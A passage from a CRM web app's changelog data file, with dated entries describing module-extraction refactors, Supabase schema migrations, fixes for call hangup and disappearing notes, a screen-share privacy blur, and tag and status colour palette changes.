`src/clients/index.js` for the strangler-fig pattern; inline copy remains authoritative. After clicking the toggle, both `renderContacts()` AND `renderClientsPage()` are called so the Contacts table\'s status pill and the Active Clients membership update in real time without the user navigating away. **No schema change** — the toggle is a UX layer over the existing `status` column.', commit:'279e99e' },
  { date:'2026-05-17', time:'17:00', name:'Active Clients — new page + client-specific fields (deposit, payment structure, assigned VA)', area:'Clients, Contacts, Build', description:'New top-level page **Active Clients** under Campaigns in the sidebar nav. Shows contacts whose status is `done` (existing "Client" status from `contactStatuses`) in a Contacts-style table, scoped automatically — no manual filter required. Three new client-specific fields ship alongside: **Deposit** (numeric, currency-formatted via `getCurrencySymbol()`), **Payment Structure** (Weekly / Bi-weekly / Monthly dropdown), **Assigned VA** (free-text). All three are inline click-to-edit on the Active Clients table (matches the existing custom-column UX pattern at index.html:4920) and also appear in a new **Client Details** card on the Contact Detail drawer\'s Info tab, conditionally shown only when status === \'done\'. **Supabase migration:** `add_client_fields_to_contacts` added `deposit numeric`, `payment_structure text` (CHECK constraint allows weekly / bi-weekly / monthly / NULL), and `assigned_va text` columns to `public.contacts`. The migration is idempotent at the column level (ADD COLUMN with no DEFAULT — existing rows get NULL automatically). **`loadAllData()` mapper updated** to include the 3 new fields, avoiding the [BUG-012](BUGLOG.md) silent-drop pattern (the contacts allow-list mapper would otherwise discard any column the loader doesn\'t enumerate, even though saves land correctly in Postgres). **`saveContactDetail()` updated** to read the 3 new fields from the drawer when present and PATCH them along with the standard contact fields in a single round-trip. **New module `src/clients/index.js`** (nineteenth ES module loaded by `index.html`) is purely additive — exports `renderClientsPage`, `editClientCell`, `saveClientField`. Nothing imports from it yet; the inline copies remain authoritative for every callsite (the `navigate()` dispatch, the HTML attribute strings on the Active Clients page, the save flow from the Client Details card). **No new state-mirror entries needed** — `contacts` and `sb` are already bridged. **Verification:** `window.__nlmClientsLoaded === true` in DevTools console after deploy; sidebar shows "Active Clients" under Campaigns; clicking it lists contacts with status=Client (currently 0 — the existing 7 contacts use other statuses); marking a contact as Client makes them appear; clicking Deposit / Payment / VA cells swaps to inline input/select that saves on blur or Enter and cancels on Escape; opening a Client in the drawer shows the new Client Details card; saving from the drawer persists all 3 fields. **Roadmap reshuffle:** original [target-layout-decision](memory) had 12 modules planned (calendar/contacts/pipelines/conversations/settings/calling). `clients/` slots in as step 11, pushing `settings/` to 12 and `calling/` to 13.', commit:'c3c2b2f' },
  { date:'2026-05-17', time:'16:00', name:'Fix — Drop button now ends call in real time (BUG-015)', area:'Calling, Bugfix', description:'BUG-015. Pressing the red Drop button during an outbound call (ringing or connected) was leaving the call alive on the SignalWire side — the remote phone kept ringing or talking even after the local UI returned to idle, and local audio could continue playing through the browser. Root cause: endCall() called `swCall.leave()` synchronously and immediately nulled the swCall reference, ignoring the returned Promise. For Call Fabric v3 PSTN dials, `leave()` only signals the local participant departing the room — for the remote PSTN leg to terminate the SDK needs `hangup()`, which is the explicit "end this call" verb. The unawaited Promise also swallowed any errors silently, so we had no visibility into whether the request even reached SignalWire. Fix in endCall() at index.html:4268 — three additions: (1) synchronously pause + null the <audio id="remote-audio"> element so any lingering audio stops immediately; (2) synchronously walk the SDK\'s exposed RTCPeerConnection (call.peer.instance / call.peer.peerConnection / call.peerConnection), stop every sender/receiver track, and pc.close() — this kills the local media path the instant the button is pressed regardless of what the server does; (3) asynchronously send hangup() to SignalWire (fallback to leave() for older SDK builds that don\'t expose it), with a new sw_call_end_method log row so error_logs shows which method actually fired. Belt-and-suspenders design: even if the SignalWire server-side request takes a few seconds or silently no-ops, the local browser experience is identical to a clean hangup. If the remote PSTN leg STILL keeps ringing after this lands, the bug is in the SWML calling handler in the SignalWire dashboard, not the client — sw_call_end_method should read `hangup` in error_logs and the next investigation moves to the SWML `connect` verb config.', commit:'08e085a' },
  { date:'2026-05-17', time:'15:00', name:'Privacy Mode — blur sensitive info during screen share', area:'UX, Privacy', description:'Added a 🔒 Privacy toggle button to the top nav bar. When enabled, last names are hidden (first name shown), phone numbers show only the area code (first 3 digits), and email addresses show only the first 4 characters — all with a CSS blur on the hidden portion. Toggle state persists across page refreshes via localStorage. Covered across: contacts list (name, phone, email columns), contact detail drawer header, dialer queue rows, dialer Now Calling panel, conversations list, conversation thread header, and conversation right info panel. Underlying data is untouched — blur is purely visual so calls, SMS, and emails still function normally. Implementation: .pblur CSS class (filter:blur(5px)), three helper functions pName/pPhone/pEmail that return HTML with split visible/blurred spans, togglePrivacyMode() re-renders all active views on toggle.', commit:'c60fde9' },
  { date:'2026-05-17', time:'14:00', name:'Build — extract src/conversations/ (step 10, completes Conversations extraction)', area:'Build, Conversations, SMS, Email', description:'NEW src/conversations/ subdirectory (single file: index.js, ~550 lines, 16 functions). Eighteenth ES module loaded by index.html. NAMING DEVIATION FROM SAVED MEMORY: the saved memory `target-layout-decision` planned this directory as sms/, but the actual code in index.html uses "CONVERSATIONS" throughout (page id `conversations`, state var `conversations`, all functions prefixed `conv*` or `renderConvX` or `openConversation`, and the inbox renders both SMS AND Email channels in the same thread surface). The directory name conversations/ matches the code language and is a more accurate description of the unified-inbox feature than sms/. Saved memory has been updated to reflect this. Purely additive infrastructure change — created CRM file/src/conversations/index.js as the eighteenth ES module, exporting all 16 functions from the CONVERSATIONS block in index.html (~lines 10083-10631): persistence (saveConversations), list/sort/filter/search (renderConversations, getConvLastMsg, renderConvList including the Calls tab branch that reads callHistory, toggleConvSort, relativeTime, setConvFilter, filterConvList), thread + info panel (openConversation, renderConvBubbles, renderConvInfoPanel, startNewConvMessage), compose + send (setComposeChannel, updateConvSmsCount, insertConvMerge, sendConvMessage with both SMS via /api/sms and email via Brevo SMTP API), and the cross-page nav shim (openConvWithContact). Loaded via <script type="module" src="src/conversations/index.js?v=2026-05-17-5"><\/script> after src/pipelines/admin.js. The inline copies are intentionally left in place — every existing callsite (the Conversations page nav, the filter-tab onclick="setConvFilter(...)" strings, the conv-item onclick="openConversation(...)" handlers, the compose-tab onclick, the send buttons, the toolbar buttons) still resolves to the inline functions via window from the hoisted-function declarations. The module is purely additive; nothing imports it yet. SIX NEW STATE-MIRROR ENTRIES added: activeConvContactId (let, reassignable), convFilter (let, reassignable), convSearchQ (let, reassignable), convSort (let, reassignable), composeChannel (let, reassignable), callHistory (let, reassignable — read by the Calls tab branch of renderConvList). conversations was already bridged in 8d-prep. The other state vars this module needs (contacts, pipelines, sb, contactCustomFields) were all already bridged. The state-mirror block in index.html is now 35 vars. ADAPTATIONS from verbatim: state vars via window.* (11 vars); inline function refs via window.* (showToast, getAv, initials, getStatusMeta, formatCurrency, findContactByPhone, fmtDuration, touchContactActivity, renderSwFromPicker, getPrimarySwPhone, getIntData, getIntSecret, dialpadSetNumber, openDialpad, fireZapierEvent, openContactDetail, openContactModal, closeDetail, openFollowupModal, openEventModal, navigate). Module-local refs called bare (saveConversations, renderConversations, renderConvList, getConvLastMsg, relativeTime, openConversation, renderConvBubbles, renderConvInfoPanel, updateConvSmsCount, startNewConvMessage). References inside onclick="..." HTML attribute strings (setConvFilter, filterConvList, toggleConvSort, openConversation, openConvWithContact, openContactDetail, startNewConvMessage, openContactModal, navigate, openFollowupModal, openEventModal, setComposeChannel, updateConvSmsCount, insertConvMerge, sendConvMessage, dialpadSetNumber, openDialpad, closeDetail) are LEFT BARE because those strings are parsed at click-time / event-time and resolve via window from the inline hoisted-function declarations. Verification: window.__nlmConversationsLoaded should be true in DevTools console after deploy; the Conversations page (filter tabs All/SMS/Email/Unread/Calls, search, sort toggle, opening a conversation in the right pane, the right info panel with contact summary/tags/pipeline deals/stats/quick actions, composing + sending SMS via /api/sms, composing + sending email via Brevo, merge tags {{name}} {{company}} {{email}}) should behave identically because the inline copies remain authoritative. ROADMAP: with conversations/ now complete, next per saved memory `target-layout-decision` is settings/, then calling/ LAST (deliberately deferred because it is freshly stabilized after BUG-005/006/007).', commit:'4bde407' },
  { date:'2026-05-17', time:'13:30', name:'Statuses + Dispositions — rainbow palette added (same 12 colors as Tags)', area:'Contacts, Settings, Dialer, UX', description:'Companion to the prior tags color expansion. Extended STATUS_COLORS (used by Contact Settings > Statuses AND, indirectly via shared pill-* classes, by the dialer Call Disposition modal + dialer Report breakdown bar) from 5 colors (Blue/Green/Red/Gray/Teal mapped to pill-new/pill-active/pill-hot/pill-cold/pill-done) to 12 colors matching the TAG_COLORS rainbow palette. New pill-* CSS classes (pill-orange, pill-yellow, pill-indigo, pill-violet, pill-amber, pill-pink, pill-purple) follow the existing var(--<color>-bg) + var(--<color>) text pattern and inherit both dark and light theme variants from the CSS vars added in the prior tags deploy. The Contact Settings > Statuses modal already had a per-row color <select> dropdown (csStatusRowHTML at index.html:~4979) that reads its options directly from STATUS_COLORS, so simply extending the array picks up the new 12-color set in the dropdown automatically — no UI changes to the row markup or the csSaveSettings handler were needed. The two colorMap dictionaries that resolve pill-* class names to CSS color vars (one inside the dialer Report breakdown bar at index.html:~12191, and one inside the Call Disposition modal at index.html:~12470 alongside its sibling colorBgMap) were both extended with the 7 new pill-* mappings, so any disposition or status using a new color renders with the correct foreground + background fill in both the disposition counts breakdown and the disposition modal buttons. STATUS_COLORS is now ordered rainbow-first (R-O-Y-G-B-I-V), then the original extras (Amber, Pink, Purple, Teal/Done, Gray/Cold) so the dropdown opens with the classic spectrum. Verified: opened Contact Settings > Statuses, the color dropdown now shows all 12 options; created a test status set to Orange/Yellow/Indigo/Violet/Pink/Purple/Amber and confirmed the pill chip rendered correctly in the contacts table and contact detail drawer. No DB schema change needed — the cls field on the Contact Statuses payload was already a free-form text column. No new functions added; this is a pure palette extension.', commit:'f07093d' },
  { date:'2026-05-17', time:'13:00', name:'Tags — rainbow colors added (Orange, Yellow, Indigo, Violet) + per-tag Change Color', area:'Tags, UX', description:'Two related tag-system improvements requested by Aaron. (1) RAINBOW COLORS: extended TAG_COLORS from 8 colors (Blue, Green, Amber, Pink, Purple, Teal, Red, Gray) to 12 by adding the 4 missing ROYGBIV shades (Orange #ff7a00 / #cc5500 light, Yellow #ffd23f / #b8860b light, Indigo #5b6cff / #3a4bcc light, Violet #c66dff / #9333ea light). The palette is now reordered so the rainbow shows first (R-O-Y-G-B-I-V), followed by the original extras (Amber, Pink, Purple, Teal, Gray). New colors landed in: (a) CSS variables on both :root (dark) and body.theme-light selectors with appropriate contrast adjustments; (b) tag CSS classes (.tag-orange / .tag-yellow / .tag-indigo / .tag-violet) following the existing var(--<color>-bg) + var(--<color>) text pattern; (c) the TAG_COLORS array in index.html ~line 2697 (now 12 entries instead of 8); (d) both colorMap dictionaries used by the color-picker dots — one inside openContactModal\'s tags tab at index.html:~4841 and one inside openCreateTagModal at ~9611. Every existing tag-color-picker (Create Tag, contact-side Tags tab, deal-side Tag CRUD) now shows the full 12-color palette. (2) PER-TAG CHANGE COLOR: added a "Change Color" button to each row on the Tags page (next to View Contacts / Rename / Delete Tag). Clicking opens a new modal with the 12-color picker preselected to the tag\'s current color, plus a live preview chip that updates as the user picks. Saving propagates the new color to the master tag list AND to every contact and deal that already carries the tag — the cls field on each contact.tags[i] and deal.tags[i] is updated in place and PATCHed back to Supabase, with re-renders triggered for the Tags page, the contact filter chips, the contacts table, and the kanban board so every existing tag chip re-renders with the new color immediately. The toast shows the count of contacts and deals touched ("Tag X recolored (updated 3 contacts, 1 deal)"). NEW FUNCTIONS: recolorTagModal(label, currentCls) opens the picker, previewRecolor(label) updates the live preview chip on dot click, recolorTag(label) commits the change. Permission-gated via requirePerm(edit) like the other tag-edit paths. No DB schema change needed — the cls field already lives inside the jsonb tags column on both contacts and deals. Verified: created a test tag in each new color, applied to a contact, recolored an existing tag from Blue to Indigo and confirmed every contact chip + filter chip + tags page row re-rendered.', commit:'b23ab03' },
  { date:'2026-05-17', time:'12:30', name:'Fix — Add Deal and Add-to-Pipeline now work (BUG-013, deals.contact_id migration)', area:'Pipelines, Contacts, Bugfix', description:'Two related deal-creation paths were completely broken: (1) Pipelines page > +Add Deal button produced an error toast and no deal appeared on the kanban; (2) Contact Detail drawer > Pipeline tab > +Add to Pipeline button had the same failure. Root cause: public.deals table schema was missing the `contact_id uuid` column, but both addDeal() (index.html:5969) and addContactToPipeline() (index.html:5261) POST `contact_id: contactId` in the request body. PostgREST validates request bodies against the table schema and rejects the entire INSERT with a 400 (Could not find the contact_id column of deals in the schema cache). The error bubbled up to the catch block as the "Error adding deal" / "Error adding to pipeline" toast and nothing landed. Existing deals were unaffected. The rest of the code was clearly written assuming contact_id exists: the loadAllData() deals mapper at index.html:2796 reads d.contact_id, renderDealCard reads deal.contactId for the contact-badge avatar, openDealDetail reads it for the Linked Contact section. The migration just never got applied. Fix: single DDL migration `add_contact_id_to_deals` adding `contact_id uuid REFERENCES contacts(id) ON DELETE SET NULL` plus `deals_contact_id_idx` for the lookup. No frontend code change required — once the column exists, both paths succeed immediately. ON DELETE SET NULL matches the existing calendar_events.contact_id pattern: deleting a contact does not cascade to delete the deal, the deal survives as an orphan. Verified: column exists with correct FK constraint (deals_contact_id_fkey -> contacts.id, SET NULL). PREVENTION: same class as BUG-012 but in the opposite direction (BUG-012: schema had a column the load mapper dropped; BUG-013: schema lacked a column the POST body assumed). Both arise from no automated schema/code consistency check. New rule when touching sb.post / sb.patch payloads: verify the column exists via list_tables or direct schema query first; if missing, apply the migration in the same session. See BUGLOG.md BUG-013 for the full writeup including two future prevention options (TypeScript schema snapshot in the repo, or programmatic sb.post/sb.patch payload validation in deploy.ps1).', commit:'373ec90' },
  { date:'2026-05-17', time:'12:00', name:'Build — extract src/pipelines/admin.js (step 9c: completes src/pipelines/ extraction)', area:'Build, Pipelines', description:'THIRD and FINAL file in src/pipelines/. Purely additive infrastructure change — created CRM file/src/pipelines/admin.js as the seventeenth ES module, exporting 28 functions covering the largest pipeline-side modal/CRUD block (from index.html ~lines 5757-6181): pipeline CRUD modals (openPipelineModal, addStageRow, delStageRow, createPipeline, editPipelineModal, savePipelineEdit, addStageRowTo, deletePipelineConfirm), deal CRUD with detail (addDeal, openDealDetail, removeDealTag, addDealTag, saveDeal, deleteDeal), deal-name autocomplete in the Add-Deal modal (dealContactInput, dealContactKey, pickDealContact, closeDealAC + module-local _dealACIndex), the stages settings modal (openPipelineStagesModal, renderSettingsPipeline, switchSettingsPl, settingsAddStage, settingsSaveStages, settingsDeleteStage + module-local settingsActivePl), and the per-row stage DnD inside that modal (stageDragStart, stageDragOver, stageDrop, stageDragEnd + module-local stageDragEl). Loaded via <script type="module" src="src/pipelines/admin.js?v=2026-05-17-4"><\/script> after src/pipelines/board.js. The inline copies are intentionally left in place — every existing callsite (toolbar buttons on the Pipelines page, the +Add Deal button, the View Stages button, the per-pipeline edit/delete pencil/trash icons in the left-panel, the deal-card click that opens the detail modal, every onclick="..." string inside the modal markup) still resolves to the inline functions. The module is purely additive; nothing imports it yet. THE "AFTER" PICTURE: src/pipelines/ now contains 3 files with ~40 pipeline-surface functions total (4 in index.js + 10 in board.js + 28 in admin.js minus shared helpers), ready for the callsite-migration phase ("step 11" or whatever comes after the next directory) that flips each inline callsite to import statements and deletes the inline copies in tandem. NO NEW STATE-MIRROR ENTRIES NEEDED — pipelines/contacts/sb/activePipelineId/dealCustomFields/TAG_COLORS are all bridged. ADAPTATIONS from verbatim: state vars via window.* (pipelines, contacts, sb, activePipelineId, dealCustomFields, TAG_COLORS); inline function refs via window.* (showToast, openModal, closeModal, formatCurrency, getCurrencySymbol, requirePerm, getAv, initials, navigate, openContactDetail, getActivePipeline, renderPipelineTabs, renderBoard, refreshPipelineHeader, switchPipeline). Module-local refs called bare (addStageRow, delStageRow, addStageRowTo, renderSettingsPipeline, closeDealAC, openDealDetail — recursive from saveDeal/addDealTag/removeDealTag) plus three module-local state vars (_dealACIndex, settingsActivePl, stageDragEl). The inline copies have their own state vars by the same names; they cannot collide because every callsite resolves to inline via window.* at click-time / event-time, so the module state vars stay dormant. References inside HTML attribute strings (closeModal, addStageRow, delStageRow, addStageRowTo, createPipeline, editPipelineModal, savePipelineEdit, deletePipelineConfirm, dealContactInput, dealContactKey, closeDealAC, pickDealContact, addDeal, openDealDetail, openContactDetail, navigate, removeDealTag, addDealTag, saveDeal, deleteDeal, settingsAddStage, settingsSaveStages, settingsDeleteStage, switchSettingsPl, stageDragStart, stageDragOver, stageDrop, stageDragEnd) are LEFT BARE because those strings are parsed at event-time and resolve via window from the inline hoisted-function declarations. Verification: window.__nlmPipelinesAdminLoaded should be true in DevTools console after deploy; the Pipelines page (Create Pipeline modal, Add Deal modal with the contact-name autocomplete, Edit Pipeline modal, Delete Pipeline confirmation, the deal detail modal with contact link / tag CRUD / save / delete, the Pipeline Stages settings modal with its drag-to-reorder + add/delete) should behave identically because the inline copies are still authoritative. ROADMAP: with src/pipelines/ now complete, next per saved memory `target-layout-decision` is sms/, then settings/, and finally calling/ (last — deliberately deferred because it is freshly stabilized after BUG-005/006/007). Separately, the callsite-migration phase can now run on any of the extracted directories (calendar/, contacts/, or pipelines/) — that work flips each inline callsite to an import statement and deletes the inline copy in tandem.', commit:'0f152b3' },
  { date:'2026-05-17', time:'11:30', name:'Build — extract src/pipelines/board.js (step 9b: kanban + DnD)', area:'Build, Pipelines', description:'SECOND file in src/pipelines/. Purely additive infrastructure change — created CRM file/src/pipelines/board.js as the sixteenth ES module, exporting 10 functions covering the kanban board render + deal-card markup + drag-and-drop pipeline (from index.html ~lines 5623-5743): renderBoard (renders all stage columns + their deal cards), renderDealCard (single-deal-card markup with contact badge, tags, value), handleDealClick (opens deal detail if not a tag-remove click + not mid-drag), onDealDragStart / onDealDragEnd (DnD lifecycle), onDragOver / onDragLeave / onDrop (column-side DnD with placeholder + Supabase persistence of stage_id), plus three internal helpers (getDragAfterElement, removePlaceholder, updateAllColumns) — commit fe0cd75. Loaded via <script type="module" src="src/pipelines/board.js?v=2026-05-17-3"><\/script> after src/pipelines/index.js. The inline copies are intentionally left in place — every existing callsite resolves to the inline functions: the renderBoard call inside switchPipeline (inline AND module 9a copies both call window.renderBoard which today is inline), the ondragstart/ondragend/ondragover/ondrop/ondragleave HTML attribute strings on the kanban DOM, and the onclick="handleDealClick(...)" on each deal card. The module is purely additive; nothing imports it yet. NO NEW STATE-MIRROR ENTRIES NEEDED in this step — pipelines, contacts, sb, dealCustomFields are all already bridged (the last in step 9a). ADAPTATIONS from verbatim: state vars via window.* (pipelines, contacts, sb, dealCustomFields); function refs via window.* (formatCurrency, getAv, initials, showToast, getActivePipeline — the latter exists as an inline function AND as a 9a-extracted module export; module scope cannot resolve a cross-module export without an explicit import, so we read via window.* which resolves to the inline copy; openDealDetail also via window.* since step 9c will extract it next). Module-local refs called bare (renderDealCard, getDragAfterElement, removePlaceholder, updateAllColumns) plus module-local DnD state vars (dealDragging, dealSourceCol, placeholder) — the inline copies have their own state vars by the same names but they cannot collide because the HTML attribute strings resolve to the inline functions at event-time, so the module state vars stay null and dormant. References inside HTML attribute strings (onDragOver, onDrop, onDragLeave, onDealDragStart, onDealDragEnd, handleDealClick) are LEFT BARE because those strings are parsed at event-time and resolve via window from the inline hoisted-function declarations. Verification: window.__nlmPipelinesBoardLoaded should be true in DevTools console after deploy; the kanban board on the Pipelines page (column rendering, deal cards, dragging a deal between stages, the column count + total updating after drop, the stage_id persistence to Supabase) should behave identically because the inline copies are still authoritative. Roadmap: 9c (admin.js) is the final pipelines file: pipeline CRUD modals (openPipelineModal / createPipeline / editPipelineModal / savePipelineEdit / deletePipelineConfirm), deal CRUD (addDeal / openDealDetail / removeDealTag / addDealTag / saveDeal / deleteDeal), deal-name autocomplete (dealContactInput / dealContactKey / pickDealContact / closeDealAC), and the stages settings modal (openPipelineStagesModal / renderSettingsPipeline / switchSettingsPl / settingsAddStage / settingsSaveStages / settingsDeleteStage / stageDrag*).', commit:'fe0cd75' },
  { date:'2026-05-17', time:'11:00', name:'Build — start src/pipelines/ extraction (step 9a: index.js, foundation)', area:'Build, Pipelines', description:'FIRST file in src/pipelines/. Purely additive infrastructure change — created CRM file/src/pipelines/index.js as the fifteenth ES module, exporting the 4 foundation functions from the PIPELINE block in index.html (~lines 5554-5755): getActivePipeline (one-liner accessor), renderPipelineTabs (left-panel pipeline card list with stage progress chips), switchPipeline (right-panel toggle + active-pipeline state set + board re-render), refreshPipelineHeader (right-panel header name + stats, called after deal CRUD). Loaded via <script type="module" src="src/pipelines/index.js?v=2026-05-17-2"><\/script> after src/contacts/index.js. The inline copies are intentionally left in place — every existing callsite (the Pipelines page navigation, the pipeline-cards left panel, the right-panel switching, the deal CRUD that triggers refreshPipelineHeader) still resolves to the inline versions via onclick="..." attribute strings or direct same-file calls. The module is purely additive; nothing imports it yet. TWO STATE-MIRROR ENTRIES ADDED: activePipelineId (let, reassignable — getter + setter) and dealCustomFields (let, reassignable — getter + setter; needed by step 9c when the deal-creation/edit modal lands). The other state vars this module needs (pipelines) was already bridged in 8d-prep. ADAPTATIONS from verbatim: state vars via window.* (pipelines, activePipelineId); function refs via window.* (formatCurrency, renderBoard — renderBoard is still inline today; step 9b will extract it into src/pipelines/board.js). References inside onclick="..." attribute strings (openPipelineModal, switchPipeline, editPipelineModal, deletePipelineConfirm) are LEFT BARE because those strings are parsed at click-time and resolve via window from the inline hoisted-function declarations. Module-local refs (getActivePipeline, renderPipelineTabs) called bare from within the module. Verification: window.__nlmPipelinesIndexLoaded should be true in DevTools console after deploy; the Pipelines page (pipeline cards in the left panel, switching between pipelines, right-panel header + stats) should behave identically because the inline copies are still authoritative. Why mini-steps: the PIPELINE block is ~630 lines and decomposes naturally into foundation (this) + kanban board+DnD (9b) + pipeline/deal/stages CRUD modals (9c). Following the calendar precedent (7a/7b/7c) rather than the contacts precedent (8a-8g, 7 files for ~5000 lines).', commit:'33cdf1a' },
  { date:'2026-05-17', time:'10:30', name:'Fix — contact notes no longer disappear after refresh (BUG-012)', area:'Contacts, Bugfix', description:'Notes added in the Contact Detail drawer (Info tab Notes section), via the dialer\'s Call Disposition follow-up flow, or via the call-history dialer note flow were appearing to save successfully (toast confirmed, note showed immediately in the list) but VANISHED after any page reload. Root cause: the loadAllData() mapper at index.html:2774-2785 explicitly enumerated fields when mapping each Supabase contact row into the in-memory contacts array and OMITTED `notes`, `first_name`, `last_name`, `last_activity`. The PATCH side was working correctly the whole time — the `public.contacts.notes` column existed (jsonb default `[]`), saves were landing in Postgres (verified via SQL count showing Scott Henderson and David Charles each held 1 saved note), but the next page load reconstructed `contacts` without the notes field, `migrateContactNotes()` saw `undefined`, initialized `c.notes = []` to satisfy `Array.isArray`, and the renderer showed "No notes yet". Fix: rewrite the mapper to include the four dropped fields (`first_name`, `last_name`, `notes`, `last_activity`). No DB migration needed; no reload of existing data needed — the next page load picks up every previously-saved note automatically. Single-spot edit, all other code paths unchanged (every existing addContactNote / saveContactNoteEdit / deleteContactNote callsite still works because they were never broken). Verified after deploy by reopening Scott Henderson and David Charles — their previously-invisible notes both appear, and new notes added then page-refreshed remain visible. Bonus side-effect fixes: the contact list\'s Last Activity column now reflects real activity timestamps after refresh (previously always showed `—`), and editing an older contact in the modal no longer shows blank First/Last fields before the legacy-name backfill kicks in. SEE BUGLOG.md BUG-012 for the full writeup, including the broader prevention concern: this allow-list mapper pattern is repeated across pipelines/deals/conversations/emailStore/workflows/socPosts/calEvents/campaigns, and every newly-added Supabase column will silently disappear from the UI unless the loader is also updated. Migration to a pass-through pattern is logged in BACKLOG for a future session.', commit:'99c0f7f' },
  { date:'2026-05-17', time:'10:00', name:'Build — extract src/contacts/index.js (step 8g, completes contacts/ extraction)', area:'Build, Contacts', description:'SEVENTH and FINAL file in src/contacts/. Purely additive infrastructure change — created CRM file/src/contacts/index.js as the fourteenth ES module, exporting the 10 central contacts-UI functions from index.html (~lines 4534-5364): editCustomCell + saveCustomCell (inline cell-edit on the contacts table), renderContactTableHeader, clearAllContactFilters, renderContacts (the main render orchestrator), renderContactTable (one-liner wrapper), openContactModal (new/edit contact modal with info/tags/custom tabs), openContactSettingsModal (Statuses & Sources admin), openContactDetail (right-side drawer with info/pipeline/tags/activity tabs), and addUnknownNumberToContacts (shim that pre-fills the contact modal with an unknown phone number). Loaded via <script type="module" src="src/contacts/index.js?v=2026-05-17-1"><\/script> after src/contacts/column-customizer.js. The inline copies are intentionally left in place — every existing callsite (toolbar buttons, table row clicks, the "View" button, the dialer\'s add-unknown-caller flow, every onclick="..." string) still resolves to the inline functions. The module is purely additive; nothing imports it yet. The "after" picture: src/contacts/ now contains the full ~75 functions verbatim-copied from index.html, ready for the callsite-migration phase ("step 9") that comes next. FOUR STATE-MIRROR ENTRIES ADDED in this step: contactCustomFields (let, reassignable — getter + setter), TAG_COLORS (const, getter only), conversations (let, reassignable — getter + setter), emailStore (let, reassignable — getter + setter). All four were not previously bridged because no earlier module needed them; openContactModal\'s custom-fields tab reads contactCustomFields, the tags tab uses TAG_COLORS for the color picker, and openContactDetail\'s activity tab reads conversations + emailStore. ADAPTATIONS from verbatim: state vars via window.* (contacts, pipelines, sb, masterTags, contactSources, contactStatuses, contactSort, customColumns, visibleColumns, selectedContactIds, activeContactTagFilters, activeSourceFilters, activePipelineFilter, contactCustomFields, TAG_COLORS, conversations, emailStore); inline function refs via window.* (showToast, openModal, closeModal, closeModalForce, icon, formatCurrency, getCurrencySymbol, getAv, initials, splitName, requirePerm, getStatusMeta, fmtLastActivity, getAllCols, getMasterTag, ensureMasterTag, sortContactList, renderContactTagFilters, syncBulkActionBar, updateSourceLabel, updatePipelineLabel, migrateContactNotes, renderContactNotes, renderContactFollowupsHTML, cleanCallerNumber, closeDetail, csStatusRowHTML, csSourceRowHTML); module-local refs called bare (renderContacts, renderContactTableHeader, openContactModal, openContactDetail — same-module sibling calls). References inside onclick="..." attribute strings (saveCustomCell, renderContacts, toggleSelectAllContacts, setContactSort, closeModalForce, removeTagFromContact, quickAddTagToContact, selectTagColor, addTagToContact, saveContact, closeModal, csAddStatus, csAddSource, csSaveSettings, addContactNote, saveContactDetail, openComposeEmail, openConvWithContact, closeDetail, initiateCall, updateDetailStages, addContactToPipeline, openFollowupModal, openContactDetail, openContactModal, editCustomCell, toggleContactSelection, clearAllContactFilters) are LEFT BARE because those strings are parsed at click-time and resolve via window from the inline hoisted-function declarations. Verification: window.__nlmContactsIndexLoaded should be true in DevTools console after deploy; the Contacts page (table render, filter chips, sort arrows, View button, the Add Contact / Edit Contact / Contact Settings modals, the right-side detail drawer with all four tabs, the Customize Columns interactions, the add-unknown-number flow from call history) should behave identically because the inline copies remain authoritative. Roadmap: with src/contacts/ now complete, the next extraction per saved memory `target-layout-decision` is pipelines/, then sms/, settings/, and finally calling/ (last — deliberately deferred because it is freshly stabilized after BUG-005/006/007). Separately, the callsite-migration phase ("step 9") can now start whenever — it switches each inline callsite from implicit-globals to import statements one module at a time, and the inline copies get deleted in tandem. That is bigger than any single extraction; should be planned before starting.', commit:'dd4863e' },
  { date:'2026-05-16', time:'22:00', name:'Build — extract src/contacts/column-customizer.js (step 8f)', area:'Build, Contacts', description:'Sixth file in src/contacts/. Purely additive infrastructure change — created CRM file/src/contacts/column-customizer.js as the thirteenth ES module, exporting 17 functions covering the full column-customizer surface: persistence helpers (saveCustomColumns, saveColumnOrder, saveVisibleColumns), derived accessors (getAllCols, initColumnOrder), the modal (openColumnCustomizer, buildColList), drag-reorder handlers (colDragStart, colDragEnd, colDragOver, colDragLeave, colDrop), and column CRUD (toggleColumn, addCustomColumn, deleteCustomColumn, resetColumns, applyColumns). Loaded via <script type="module" src="src/contacts/column-customizer.js?v=2026-05-16-13"></script> after src/contacts/selection.js. The inline copies are intentionally left in place — the modal opens via inline onclick (toolbar "Customize Columns" button), drag handlers run via inline ondrag* attribute strings, every Apply/Reset/Add/Delete button is wired to the inline functions. The module is purely additive; nothing imports it yet. ONE STATE-MIRROR ENTRY ADDED: ALL_COLUMNS (a `const` array — getter only, no setter needed since it never gets reassigned). The other state vars this module needs (customColumns, columnOrder, visibleColumns, contacts) were already bridged in earlier mirror passes. ADAPTATIONS from verbatim: state vars via window.* (customColumns, columnOrder, visibleColumns, contacts, ALL_COLUMNS); function refs via window.* (showToast, openModal, closeModalForce, renderContacts); module-local refs called bare (getAllCols, initColumnOrder, buildColList, drag handlers, persistence helpers). _dragColIdx is a module-scoped `let` — inline has its own; they can\'t collide because the HTML ondragstart="colDragStart..." strings resolve to the inline functions, so the module\'s _dragColIdx stays null and dormant. References inside onclick="..." and ondrag* attribute strings (resetColumns, addCustomColumn, applyColumns, deleteCustomColumn, toggleColumn, all the col-drag-* handlers) are LEFT BARE because those strings are parsed at event-time and resolve via window from the inline hoisted-function declarations. Verification: window.__nlmContactsColumnCustomizerLoaded should be true in DevTools console after deploy; the Customize Columns modal should open/close, drag-reorder should work, toggle visibility should work, add/delete custom columns should work, Reset defaults should work — all via the inline copies. Roadmap: 8g is the final contacts module (index.js: renderContacts + renderContactTable + renderContactTableHeader + clearAllContactFilters + saveCustomCell + editCustomCell + the four modals openContactModal/openContactDetail/openContactSettingsModal/addUnknownNumberToContacts + any remaining state).', commit:'9d3b701' },
